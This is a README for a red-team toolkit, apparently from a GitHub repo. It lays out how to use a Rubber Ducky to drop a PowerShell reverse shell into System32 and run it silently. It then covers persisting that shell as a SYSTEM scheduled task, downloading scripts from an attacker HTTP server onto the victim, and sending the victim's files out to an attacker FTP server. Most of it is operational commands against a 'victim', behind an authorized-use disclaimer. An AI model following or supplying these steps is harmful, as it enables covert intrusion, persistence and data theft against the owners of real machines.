⚠️ Disclaimer
This project is created strictly for educational purposes, penetration testing, and red team research in authorized environments only.

Any use of this code outside of a controlled, lawful environment — such as unauthorized access, system exploitation, or malicious deployment — is strictly prohibited and may be illegal.

The author(s) of this project do not endorse or support any illegal activity and assume no responsibility for misuse or damage caused by the use of this tool.

Always obtain explicit written permission before testing any system or network that you do not own.


---

#  Project Execution Flow
0. **Clone the GitHub Repo**

This setup consists of two main modules:

1. **Reverse Shell Module** – for gaining initial access and persistence.
2. **File Transfer Module** – for uploading files from the victim system to your own server via FTP.

---

##  Reverse Shell Module

> This module establishes a reverse shell from the victim machine back to the attacker system and ensures it persists across reboots and unlocks.

###  Prerequisite

* Start a Netcat listener on your attacker machine:

```bash
nc -nvlp 1111
```

This sets up a listener on port `1111` to receive the incoming reverse shell connection.

---

### 🔹 Step-by-Step

#### **1. Deploy `L.ps1` using Rubber Ducky**

* Copy the PowerShell reverse shell script `L.ps1` to the **Rubber Ducky** (CIRCUITPY drive).
* Flash the Rubber Ducky with the provided `payload.dd` Ducky Script.
* Plug the Ducky into the target machine. It will:

  * Copy `L.ps1` to `C:\Windows\System32\`
  * Execute it silently using PowerShell
* This establishes a reverse shell connection to your Netcat listener.

---

#### **2. Establish Persistence (Optional but Recommended)**

* On the victim system (via the reverse shell), run the **single-line persistence command** found in the `Schedule for nt authority` file.
* This command sets up a **scheduled task** that:

  * Runs `L.ps1` on system startup and unlock.
  * Uses **NT AUTHORITY\SYSTEM** privileges.

Once done, you will have a **persistent reverse shell** as SYSTEM — even after reboots or user unlocks.

---

##  File Transfer Module

> This module allows you to transfer files from and to the victim.

###  Prerequisite

* Start a local HTTP server on the attacker machine `File_Transfer`(ClonedRepo) folder:

```bash
python3 -m http.server 8000
```

---

### 🔹 Step-by-Step

#### **1. Download `put.ps1 and get.ps1` to Victim**

From the victim machine (via reverse shell), download the `put.ps1 and get.ps1` script using:

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>:8000/put.ps1" -OutFile "C:\Windows\System32\Transfer.ps1"
Invoke-WebRequest -Uri "http://<attacker-ip>:8000/get.ps1" -OutFile "C:\Windows\System32\Transfer.ps1"
```

Replace `<attacker-ip>` with your actual IP address.

---

#### **2. Configure FTP Server**

* Host an FTP server on your machine using tools like `vsftpd`.
* Ensure:

  * The FTP server is running on the port defined in the script (default: `21`).
  * A directory named `uploads` should exist on the FTP server.

---

#### **3. Set Variables in for Transfer**

Before executing the script, set the following variables:

```powershell
$IP="192.168.1.16:8000"
$ftpserver = "192.168.1.10"
$ftpport = 21
$ftpusername = "username" 
$ftppassword = "password"

```

**Note: Now that everything is set you need to run put.ps1 and get.ps1 on the reverse shell (here on in future after you close this shell and open a new one there is no need to run the get.ps1 and put.ps1 again.)**

---

#### **4. Transfer the files**

The commad to download the file from the victim is as follows:

```powershell
get "File_Name"
```

This will upload the specified file(s) to your FTP server’s `/uploads` directory.

---

The commad to put the file to the victim is as follows:

```powershell
put "File_Name"
```

This will upload the specified file(s) to the victim directory.

**Note: Make sure you are running the python http server and that server directory contains the file you want to put on the victim.**

---